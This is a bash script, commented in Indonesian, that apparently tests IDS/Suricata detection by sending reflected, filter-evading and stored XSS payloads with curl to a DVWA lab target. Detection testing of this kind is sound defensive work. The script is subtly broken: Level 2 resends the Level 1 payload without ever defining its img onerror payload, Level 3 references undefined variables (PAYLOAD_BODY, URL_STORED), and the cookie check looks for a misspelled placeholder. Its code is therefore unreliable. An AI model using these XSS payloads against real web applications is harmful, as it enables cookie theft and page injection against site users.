#!/bin/bash

# =================================================================
# MODUL 05: CROSS-SITE SCRIPTING (XSS)
# Strategi: 3 Level Depth (Reflected, Obfuscated, Stored/POST)
# Target: DVWA (XSS Reflected & Stored)
# =================================================================

#KONFIGURASI
TARGET_IP="192.168.x.x"
# Masukkan PHPSESSID dari login DVWA (Sama seperti modul SQLmap)
COOKIE="security=low; PHPSESSID=ganti_dengan_session_id_anda"
LOG_FILE="logs/xss_session_$(date +%F).log"

echo "[+] [05_XSS] Memulai Skenario XSS Injection..."
echo "[+] Target IP: $TARGET_IP"

# Cek Cookie
if [[ "$COOKIE" == *"genti_dengan"* ]]; then
   echo "[!] WARNING: Cookie belum di-set! Script akan gagal login DVWA."
   sleep 5
fi

# -----------------------------------------------------------------
# LEVEL 1: REFLECTED XSS (BASIC)
# Tujuan: Menguji deteksi tag standar <script> di URL (GET).
# Payload: <script>alert('IDS')</script>
# -----------------------------------------------------------------
echo "[Level 1] Running Reflected XSS (Tag Script Standar)..."
# URL Encode sederhana dilakukan manual disini agar script bersih
# Payload: <script>alert('XSS')</script>
PAYLOAD="%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"
URL="http://$TARGET_IP/dvwa/vulnerabilities/xss_r/?name=$PAYLOAD"

curl -s -b "$COOKIE" "$URL" -o logs/xss_lvl1.html
echo "    -> Selesai. (Harapan: Alert ET WEB_SERVER Script tag in URI)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 2: REFLECTED XSS (EVASION / POLYGLOT)
# Tujuan: Menguji rule yang terlalu spesifik pada tag <script>.
# Teknik: Menggunakan tag gambar (<img onerror>) atau SVG.
# Payload: <img src=x onerror=alert(1)>
# -----------------------------------------------------------------
echo "[Level 2]  Running Evasion XSS (Image OnError Tag)..."
# Payload ini sering lolos jika rule IDS hanya mencari "<script>"
URL="http://$TARGET_IP/dvwa/vulnerabilities/xss_r/?name=$PAYLOAD"

curl -s -b "$COOKIE" "$URL" -o logs/xss_lvl2.html
echo "    -> Selesai. (Harapan: Deteksi via pola 'onerror' atau atribut event)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 3: STORED XSS (POST METHOD)
# Tujuan: Menguji deteksi pada HTTP BODY (Bukan URL).
# Teknik: Mengirim payload via POST ke Guestbook DVWA.
# Payload: Cookie Stealer simulation
# -----------------------------------------------------------------
echo "[Level 3] Running Stored XSS via POST (HTTP Body)..."
URL_STORE="http://$TARGET_IP/dvwa/vulnerabilities/xss_s/"
PAYLOAD_BOD="txtName=Hacker&mtxMessage=<script>alert(document.cookie)</script>&btnSign=Sign+Guestbook"

curl -s -X POST -b "$COOKIE" -d "$PAYLOAD_BODY" "$URL_STORED" -o logs/xss_lvl3.html
echo "    -> Selesai. (Harapan: Suricata menginspeksi HTTP Request Body)"

echo "[+] [05_XSS] Skenario Selesai pada $(date)"
echo "-----------------------------------------------------------"
